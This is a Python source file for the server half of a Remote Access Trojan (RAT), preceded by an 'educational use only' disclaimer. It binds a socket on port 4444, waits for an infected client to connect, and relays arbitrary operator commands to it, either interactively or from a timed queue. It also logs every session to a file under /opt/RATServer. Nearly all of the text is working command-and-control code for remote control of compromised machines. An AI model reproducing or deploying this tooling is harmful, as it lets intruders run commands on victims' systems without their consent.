#This project is solely for educational use. The author does not authorize
#the use of this project for any malicious or illegal actions.

import os
import socket
import time
import sys
from threading import Timer

#create a socket object for use throughout the program
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#port variable for server to open the port on
port = 4444
host = '127.0.0.1'

#Queue array to hold commands
queue = []

#Variable for the log file name
logFileName = "RAT_Server_log" + str(time.time()) + ".txt"

def help():
    print('=' * 5, 'HELP', '=' * 5)
    print('Enter "quit" to tell the remote server to end the connection')
    print('Enter "stop" to stop RAT server')
    print('Enter "queue" to queue commands to run on the client')
    print('='*16)

def sendCommand(cmd):
    msg = cmd.encode("UTF-8")
    clientaddr.send(msg)
    message = clientaddr.recv(4096)
    print(message.decode("UTF-8"))

def addCommandtoQueue(cmd):
    queue.append(cmd)

def clearQueue():
    queue.clear()

def runCommandsInQueue():
    print('=' * 5, "Command queue running now...", '=' * 5)
    for i in queue:
        sendCommand(i)
    print('=' * 5, "Command queue finished running", '=' * 5)
    print('=' * 5, "Clearing command queue", '=' * 5)
    clearQueue()
    print("Your command to send: \n")

def startQueue(sec):
    global timer
    timer = Timer(sec, runCommandsInQueue, args=None, kwargs=None)
    try:
        timer.start()
    except Exception as e:
        print("The following exception has occurred: ", e)

def stopQueueFromRunning():
    timer.cancel()

class LoggingPrinter:
    def __init__(self, filename):
        self.out_file = open(filename, "w")
        self.old_stdout = sys.stdout
        #this object will take over `stdout`'s job
        sys.stdout = self
    #executed when the user does a `print`
    def write(self, text):
        self.old_stdout.write(text)
        self.out_file.write(text)
    #executed when `with` block begins
    def __enter__(self):
        return self
    #executed when `with` block ends
    def __exit__(self, type, value, traceback):
        #we don't want to log anymore. Restore the original stdout object.
        sys.stdout = self.old_stdout

#Create directory for the logfile
os.system("mkdir -p /opt/RATServer/")

logFileName = "/opt/RATServer/" + logFileName

with LoggingPrinter(logFileName):

    print("Starting the server...")

    try:
        #Open a port on the server and start listening on it
        s.bind((host, port))
        s.listen()
        print("Server started successfully on port", port)
    except Exception as e:
        print("The following error has occurred: ", e)
        exit()

    print("Awaiting connection from client...")
    print("Please wait for connection before issuing commands")

    #accept connection from client software
    #let the end user know that a successful connection came from the client
    try:
        clientaddr = s.accept()[0]
        print("Connection accepted from", clientaddr.getsockname()[0])
    except Exception as e:
        print("The following error has occurred: ", e)
        exit()

    #start accepting commands from the end user
    while True:
        command = input("Your command to send: \n")

        #if user enters "help", then the server should display a help message
        if command.lower() == 'help':
            print(command)
            help()
        #allow the user to queue commands to run on the client
        elif command.lower() == 'queue':
            print("Do you want to adjust the queue timer, stop the queue timer (and keep the commands in the queue),"
                  " add commands to the queue, clear and stop the queue, or go back to the RAT interface?\n")
            while True:
                decision = input('Type "adjust", "stop", "add", "clear", or "back"\n')
                if decision.lower() == 'adjust':
                    seconds = input("Enter the number of seconds you want to wait before queue executes\n")
                    seconds = int(seconds)
                    startQueue(seconds)
                    print("Queue scheduled to run in " + str(seconds) + " seconds. Returning to RAT terminal")
                    break
                elif decision.lower() == 'stop':
                    stopQueueFromRunning()
                    print("Returning to RAT terminal\n")
                    break
                elif decision.lower() == 'add':
                    queueCommands = input("Enter at least 2 commands you want to run on the client. Separate each command with a"
                                          " comma followed by a space. Example: ls, pwd, whoami\n")
                    queueCommands = queueCommands.split(',')
                    for i in queueCommands:
                        addCommandtoQueue(i)
                    seconds = input("Enter the number of seconds you want to wait before queue executes\n")
                    seconds = int(seconds)
                    startQueue(seconds)
                    print("Queue scheduled to run in " + str(seconds) + " seconds. Returning to RAT terminal")
                    break
                elif decision.lower() == 'clear':
                    clearQueue()
                    stopQueueFromRunning()
                    print("Command queue cleared and stopped. Returning to RAT terminal\n")
                    break
                elif decision.lower() == 'back':
                    break
                else:
                    print("Not a valid selection.\n")
        #if the user enters "quit", then the server should kill the remote connection
        elif command.lower() == 'quit':
            print(command)
            print("Killing the remote connection")
            sendCommand("quit")
        #if the user enters "stop", the RAT server software should stop running
        elif command.lower() == "stop":
            print(command)
            print("Stopping the RAT server software")
            print("Log file of session created at " + logFileName)
            exit(0)
        else:
            print(command)
            sendCommand(command)